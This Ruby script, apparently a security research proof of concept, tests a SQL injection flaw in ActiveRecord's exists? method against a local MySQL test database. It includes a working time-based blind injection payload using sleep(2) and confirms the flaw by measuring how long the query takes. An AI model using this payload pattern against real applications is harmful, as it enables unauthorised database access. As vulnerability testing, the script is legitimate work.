#!/usr/bin/env ruby
# frozen_string_literal: true

# Basic SQL Injection Test - Verify exists? vulnerability still works
# This is a baseline test before testing multi-statements

require 'active_record'
require 'mysql2'

# Database configuration
DB_CONFIG = {
  adapter: 'mysql2',
  host: 'localhost',
  username: 'root',
  password: '',
  database: 'test_multi_statement',
  encoding: 'utf8mb4'
}.freeze

# Connect to database
ActiveRecord::Base.establish_connection(DB_CONFIG)

# Ensure test table exists
begin
  ActiveRecord::Base.connection.execute("CREATE TABLE IF NOT EXISTS test_users (
    id INT PRIMARY KEY AUTO_INCREMENT,
    userid VARCHAR(50),
    email VARCHAR(100)
  )")
  
  # Insert test data if table is empty
  count = ActiveRecord::Base.connection.execute("SELECT COUNT(*) as cnt FROM test_users").first
  if count['cnt'] == 0
    ActiveRecord::Base.connection.execute("INSERT INTO test_users (userid, email) VALUES
      ('admin', 'admin@test.com'),
      ('user1', 'user1@test.com')")
  end
rescue => e
  puts "Note: #{e.message}"
end

# Define model
class TestUser < ActiveRecord::Base
  self.table_name = 'test_users'
end

puts "=" * 80
puts "Basic SQL Injection Test - ActiveRecord exists?"
puts "=" * 80
puts ""

# Test 1: Normal exists? with hash (safe)
puts "TEST 1: Safe exists? with hash parameter"
puts "----------------------------------------"
puts "Code: TestUser.exists?(id: 1)"
puts "Parameter: {id: 1} (hash - safe, parameterized)"
puts ""
begin
  result = TestUser.exists?(id: 1)
  puts "Result: #{result}"
  puts "Status: PASS - Safe parameterized query works"
  puts ""
  puts "Expected SQL: SELECT 1 AS one FROM test_users WHERE test_users.id = 1 LIMIT 1"
  puts "              (Parameterized - safe from SQL injection)"
rescue => e
  puts "ERROR: #{e.class}: #{e.message}"
  puts "Status: FAIL"
  exit 1
end
puts ""
puts ""

# Test 2: Vulnerable exists? with array (SQL injection)
puts "TEST 2: Vulnerable exists? with array parameter (SQL injection)"
puts "----------------------------------------------------------------"
puts "Code: TestUser.exists?([\"id = 1\"])"
puts "Parameter: [\"id = 1\"] (array without hash key - VULNERABLE)"
puts ""
begin
  # This is the vulnerable pattern - array without hash key
  payload = ["id = 1"]
  puts "Payload array: #{payload.inspect}"
  puts "First element: #{payload.first.inspect}"
  puts ""
  
  result = TestUser.exists?(payload)
  puts "Result: #{result}"
  puts ""
  puts "Expected SQL: SELECT 1 AS one FROM test_users WHERE (id = 1) LIMIT 1"
  puts "              (Raw SQL interpolation - VULNERABLE to injection)"
  puts ""
  puts "Status: PASS - SQL injection vulnerability confirmed"
  puts "         The array parameter is interpolated directly into SQL without escaping"
rescue => e
  puts "ERROR: #{e.class}: #{e.message}"
  puts "Status: FAIL - Unexpected error"
  exit 1
end
puts ""
puts ""

# Test 3: SQL injection with sleep (time-based)
puts "TEST 3: SQL injection with sleep() - time-based blind"
puts "-----------------------------------------------------"
puts "Code: TestUser.exists?([\"'test') OR sleep(2) OR ('x'\"])"
puts "Parameter: [\"'test') OR sleep(2) OR ('x'\"] (malicious payload)"
puts ""
start_time = Time.now
begin
  payload = ["'test') OR sleep(2) OR ('x'"]
  puts "Payload array: #{payload.inspect}"
  puts "First element: #{payload.first.inspect}"
  puts ""
  puts "Expected SQL: SELECT 1 AS one FROM test_users WHERE ('test') OR sleep(2) OR ('x') LIMIT 1"
  puts "              (sleep(2) will execute if injection works)"
  puts ""
  puts "Executing query..."
  
  result = TestUser.exists?(payload)
  elapsed = Time.now - start_time
  
  puts ""
  puts "Result: #{result}"
  puts "Elapsed time: #{elapsed.round(2)}s"
  puts ""
  if elapsed >= 1.5
    puts "Status: PASS - sleep() executed, confirming SQL injection"
    puts "         Query took ~#{elapsed.round(2)}s (expected ~2s) - sleep() worked!"
  else
    puts "Status: FAIL - sleep() did not execute"
    puts "         Query took only #{elapsed.round(2)}s (expected ~2s)"
    exit 1
  end
rescue => e
  puts "ERROR: #{e.class}: #{e.message}"
  puts "Status: FAIL"
  exit 1
end
puts ""
puts ""

puts "=" * 80
puts "SUMMARY"
puts "=" * 80
puts "✓ Basic SQL injection via exists? with array parameter: CONFIRMED"
puts "✓ Time-based blind injection (sleep): CONFIRMED"
puts ""
puts "This confirms the vulnerability exists before testing multi-statements."

